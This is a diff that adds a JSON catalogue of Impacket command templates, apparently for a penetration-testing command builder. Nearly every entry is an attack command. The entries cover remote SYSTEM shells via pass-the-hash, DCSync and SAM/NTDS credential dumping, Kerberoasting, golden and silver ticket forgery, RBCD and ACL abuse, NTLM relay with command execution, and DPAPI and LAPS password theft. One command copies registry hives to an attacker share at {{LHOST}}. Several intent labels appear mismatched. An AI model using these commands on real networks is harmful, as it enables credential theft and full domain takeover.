@@ -1,0 +1,141 @@
+{
+  "tools": [
+    { "name": "impacket-psexec", "description": "SYSTEM shell via an SMB-installed service.", "commands": [
+      { "purpose": "SYSTEM shell with credentials", "template": "impacket-psexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "SYSTEM shell with an NT hash", "template": "impacket-psexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "SYSTEM shell with the Kerberos ticket in KRB5CCNAME", "template": "impacket-psexec -k -no-pass <domain>/<user>@<host>", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-wmiexec", "description": "Semi-interactive shell over WMI (quieter than psexec).", "commands": [
+      { "purpose": "Shell with credentials", "template": "impacket-wmiexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "Shell with an NT hash", "template": "impacket-wmiexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-smbexec", "description": "Command execution over SMB.", "commands": [
+      { "purpose": "Shell with credentials", "template": "impacket-smbexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "Shell with an NT hash", "template": "impacket-smbexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-atexec", "description": "Runs one command as SYSTEM through a scheduled task (no service created).", "commands": [
+      { "purpose": "Run one command with credentials", "template": "impacket-atexec <domain>/<user>:<pass>@{{TARGET}} 'whoami'", "intent": "authenticate" },
+      { "purpose": "Run one command with an NT hash", "template": "impacket-atexec -hashes :<hash> <domain>/<user>@{{TARGET}} 'whoami'", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-dcomexec", "description": "Semi-interactive shell over DCOM (MMC20, ShellWindows); works when SMB exec is blocked.", "commands": [
+      { "purpose": "Shell over DCOM with credentials", "template": "impacket-dcomexec -object MMC20 <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "Shell over DCOM with an NT hash", "template": "impacket-dcomexec -object MMC20 -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-mssqlclient", "description": "Impacket MSSQL client with handy built-in commands.", "commands": [
+      { "purpose": "Log in with a SQL account", "template": "impacket-mssqlclient '<user>:<pass>@{{TARGET}}'", "intent": "authenticate" },
+      { "purpose": "Log in with a Windows / domain account", "template": "impacket-mssqlclient '<domain>/<user>:<pass>@{{TARGET}}' -windows-auth", "intent": "authenticate" },
+      { "purpose": "Log in as a domain account with an NT hash", "template": "impacket-mssqlclient -hashes :<hash> '<domain>/<user>@{{TARGET}}' -windows-auth", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-smbclient", "description": "SMB client that takes hashes and tickets (shares, use, ls, get, put).", "commands": [
+      { "purpose": "Browse shares with credentials (type shares, then use <share>)", "template": "impacket-smbclient <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "Browse shares with an NT hash", "template": "impacket-smbclient -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-smbserver", "description": "Stand up an SMB share on Kali for file transfer.", "commands": [
+      { "purpose": "Serve the current dir as share 'share' (SMB2 for modern Windows)", "template": "impacket-smbserver share $(pwd) -smb2support", "intent": "transfer" },
+      { "purpose": "Serve with credentials (Windows refuses guest SMB in many builds)", "template": "impacket-smbserver share $(pwd) -smb2support -user <user> -password <pass>", "intent": "transfer" }
+    ]},
+    { "name": "impacket-secretsdump", "description": "Dump local and domain secrets over the network or from hives", "commands": [
+      { "purpose": "DCSync all domain hashes with creds/rights", "template": "impacket-secretsdump -just-dc <domain>/<user>:<pass>@{{TARGET}}", "intent": "dump" },
+      { "purpose": "Parse saved SAM/SYSTEM/SECURITY hives", "template": "impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL", "intent": "dump" },
+      { "purpose": "DCSync using a hash", "template": "impacket-secretsdump -just-dc -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "dump" },
+      { "purpose": "Remote dump as local admin: SAM, LSA secrets, cached logons", "template": "impacket-secretsdump <domain>/<user>:<pass>@{{TARGET}}", "intent": "dump" },
+      { "purpose": "Parse a copied ntds.dit offline", "template": "impacket-secretsdump -ntds ntds.dit -system system.save LOCAL", "intent": "dump" }
+    ]},
+    { "name": "impacket-reg", "description": "Remote registry: query keys or save the hives over SMB.", "commands": [
+      { "purpose": "Save SAM, SYSTEM and SECURITY to your smbserver share", "template": "impacket-reg <domain>/<user>:<pass>@{{TARGET}} backup -o '\\\\{{LHOST}}\\share'", "intent": "dump" },
+      { "purpose": "Read Winlogon for autologon passwords", "template": "impacket-reg <domain>/<user>:<pass>@{{TARGET}} query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'", "intent": "dump" }
+    ]},
+    { "name": "impacket-services", "description": "Lists, creates and starts Windows services remotely.", "commands": [
+      { "purpose": "List services on the host", "template": "impacket-services <domain>/<user>:<pass>@{{TARGET}} list", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-lookupsid", "description": "Brute-forces SIDs over MS-LSAT to list users and groups, and shows the domain SID.", "commands": [
+      { "purpose": "List users with the guest account or a null session", "template": "impacket-lookupsid guest@{{TARGET}} -no-pass", "intent": "enumerate" },
+      { "purpose": "List users and the domain SID with credentials", "template": "impacket-lookupsid <domain>/<user>:<pass>@{{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-samrdump", "description": "Lists users and their account details over MS-SAMR.", "commands": [
+      { "purpose": "Dump users over a null session", "template": "impacket-samrdump {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Dump users with credentials", "template": "impacket-samrdump <domain>/<user>:<pass>@{{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-rpcdump", "description": "Lists RPC endpoints from the endpoint mapper.", "commands": [
+      { "purpose": "Map the RPC endpoints", "template": "impacket-rpcdump -port 135 {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Is the print spooler reachable (PrinterBug, PrintNightmare)?", "template": "impacket-rpcdump {{TARGET}} | grep -E 'MS-RPRN|MS-PAR'", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-DumpNTLMInfo", "description": "Reads hostname, domain and OS version from the NTLM handshake, no credentials needed.", "commands": [
+      { "purpose": "Name the host and domain before you have creds", "template": "impacket-DumpNTLMInfo {{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-GetADUsers", "description": "Lists domain users with their last logon and password-set dates.", "commands": [
+      { "purpose": "List every domain user", "template": "impacket-GetADUsers -all -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-findDelegation", "description": "Lists accounts with unconstrained, constrained or resource-based delegation.", "commands": [
+      { "purpose": "Find every delegation in the domain", "template": "impacket-findDelegation -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-GetNPUsers", "description": "Requests AS-REP for accounts without Kerberos pre-auth", "commands": [
+      { "purpose": "AS-REP roast a user list", "template": "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip {{TARGET}} -no-pass -format hashcat", "intent": "dump" },
+      { "purpose": "AS-REP roast one known user", "template": "impacket-GetNPUsers <domain>/<user> -no-pass -dc-ip {{TARGET}}", "intent": "dump" },
+      { "purpose": "With creds: find and roast every account without pre-auth", "template": "impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip {{TARGET}} -format hashcat", "intent": "dump" }
+    ]},
+    { "name": "impacket-GetUserSPNs", "description": "Requests Kerberoast TGS hashes for SPN accounts", "commands": [
+      { "purpose": "Roast all SPN accounts", "template": "impacket-GetUserSPNs -dc-ip {{TARGET}} <domain>/<user>:<pass> -request", "intent": "dump" },
+      { "purpose": "Roast one target account", "template": "impacket-GetUserSPNs -dc-ip {{TARGET}} <domain>/<user>:<pass> -request-user <user>", "intent": "dump" },
+      { "purpose": "Kerberoast with an NT hash", "template": "impacket-GetUserSPNs -dc-ip {{TARGET}} -hashes :<hash> <domain>/<user> -request", "intent": "dump" }
+    ]},
+    { "name": "impacket-getTGT", "description": "Requests a Kerberos TGT from a password or hash", "commands": [
+      { "purpose": "Get a TGT with a hash", "template": "impacket-getTGT <domain>/<user> -hashes :<hash> -dc-ip {{TARGET}}", "intent": "authenticate" },
+      { "purpose": "Get a TGT with a password", "template": "impacket-getTGT <domain>/<user>:<pass> -dc-ip {{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-getST", "description": "Requests Kerberos service tickets, incl. delegation impersonation", "commands": [
+      { "purpose": "Constrained delegation impersonation ticket", "template": "impacket-getST -spn <spn> -impersonate administrator -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" },
+      { "purpose": "RBCD impersonation ticket with a hash", "template": "impacket-getST -spn cifs/{{DNS}} -impersonate administrator -hashes :<hash> <domain>/<user>", "intent": "exploit" },
+      { "purpose": "RBCD: impersonate administrator from the computer you added", "template": "impacket-getST -spn cifs/<host> -impersonate administrator -dc-ip {{TARGET}} '<domain>/SLG$:<pass>'", "intent": "exploit" }
+    ]},
+    { "name": "impacket-ticketer", "description": "Forges golden and silver Kerberos tickets offline", "commands": [
+      { "purpose": "Forge a golden ticket from the krbtgt hash", "template": "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> administrator", "intent": "exploit" },
+      { "purpose": "Forge a silver ticket for one service", "template": "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <spn> administrator", "intent": "exploit" },
+      { "purpose": "Child-to-parent golden ticket with Enterprise Admins in the extra SID", "template": "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -extra-sid <sid>-519 administrator", "intent": "exploit" }
+    ]},
+    { "name": "impacket-ticketConverter", "description": "Converts tickets between kirbi (Rubeus, mimikatz) and ccache (Linux tools).", "commands": [
+      { "purpose": "kirbi to ccache, for impacket and nxc", "template": "impacket-ticketConverter <file>.kirbi <file>.ccache", "intent": "tune" },
+      { "purpose": "ccache to kirbi, for Rubeus or mimikatz", "template": "impacket-ticketConverter <file>.ccache <file>.kirbi", "intent": "tune" }
+    ]},
+    { "name": "impacket-describeTicket", "description": "Prints what a ticket holds: user, groups, SPN, expiry.", "commands": [
+      { "purpose": "Check a ticket before you use it", "template": "impacket-describeTicket <file>.ccache", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-raiseChild", "description": "Child domain admin to forest root in one step (golden ticket with extra SID).", "commands": [
+      { "purpose": "From child-domain admin to Enterprise Admin", "template": "impacket-raiseChild <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-addcomputer", "description": "Adds a computer account you control (MachineAccountQuota, 10 by default).", "commands": [
+      { "purpose": "Add computer SLG$ for RBCD", "template": "impacket-addcomputer -computer-name 'SLG$' -computer-pass '<pass>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-rbcd", "description": "Reads and writes msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD", "commands": [
+      { "purpose": "Write RBCD from a controlled account to the target", "template": "impacket-rbcd -delegate-from '<computer>$' -delegate-to '<target>$' -action write -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" }
+    ]},
+    { "name": "impacket-dacledit", "description": "Reads and writes ACEs on AD objects (GenericAll, WriteDacl abuse).", "commands": [
+      { "purpose": "Read the rights a principal has on an object", "template": "impacket-dacledit -action read -target '<user>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" },
+      { "purpose": "Grant yourself FullControl on an object (needs WriteDacl)", "template": "impacket-dacledit -action write -rights FullControl -target '<user>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" },
+      { "purpose": "Grant yourself DCSync on the domain (needs WriteDacl on it)", "template": "impacket-dacledit -action write -rights DCSync -target-dn 'DC=<domain>,DC=<dc>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-owneredit", "description": "Changes the owner of an AD object (WriteOwner abuse).", "commands": [
+      { "purpose": "Make yourself the owner, then grant rights with dacledit", "template": "impacket-owneredit -action write -new-owner '<user>' -target '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-changepasswd", "description": "Changes or resets passwords over SMB, Kerberos or LDAP.", "commands": [
+      { "purpose": "Set a new password when the old one has expired", "template": "impacket-changepasswd '<domain>/<user>:<pass>@{{TARGET}}' -newpass '<pass>'", "intent": "authenticate" },
+      { "purpose": "Reset another user's password (ForceChangePassword)", "template": "impacket-changepasswd '<domain>/<user>@{{TARGET}}' -reset -altuser '<user>' -altpass '<pass>' -newpass '<pass>'", "intent": "enumerate" }
+    ]},
+    { "name": "impacket-Get-GPPPassword", "description": "Finds and decrypts Group Policy Preferences passwords (cpassword) in SYSVOL.", "commands": [
+      { "purpose": "Search SYSVOL for cpassword and decrypt it", "template": "impacket-Get-GPPPassword <domain>/<user>:<pass>@{{TARGET}}", "intent": "dump" },
+      { "purpose": "Decrypt a Groups.xml you already downloaded", "template": "impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL", "intent": "dump" }
+    ]},
+    { "name": "impacket-GetLAPSPassword", "description": "Reads LAPS passwords the account is allowed to see.", "commands": [
+      { "purpose": "Read every LAPS password you can", "template": "impacket-GetLAPSPassword -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "dump" }
+    ]},
+    { "name": "impacket-ntlmrelayx", "description": "Relays captured NTLM authentication to other services", "commands": [
+      { "purpose": "Relay to unsigned SMB hosts", "template": "impacket-ntlmrelayx -tf relay.txt -smb2support", "intent": "exploit" },
+      { "purpose": "Relay to LDAP to delegate access", "template": "impacket-ntlmrelayx -t ldap://{{TARGET}} --delegate-access", "intent": "exploit" },
+      { "purpose": "Relay to unsigned SMB and run one command", "template": "impacket-ntlmrelayx -tf relay.txt -smb2support -c '<command>'", "intent": "exploit" }
+    ]},
+    { "name": "impacket-dpapi", "description": "Decrypts DPAPI master keys, credential files and vaults offline.", "commands": [
+      { "purpose": "Decrypt a master key with the user's password", "template": "impacket-dpapi masterkey -file <file> -sid <sid> -password '<pass>'", "intent": "dump" },
+      { "purpose": "Decrypt a credential file with the master key", "template": "impacket-dpapi credential -file <file> -key <key>", "intent": "dump" }
+    ]}
+  ]
+}
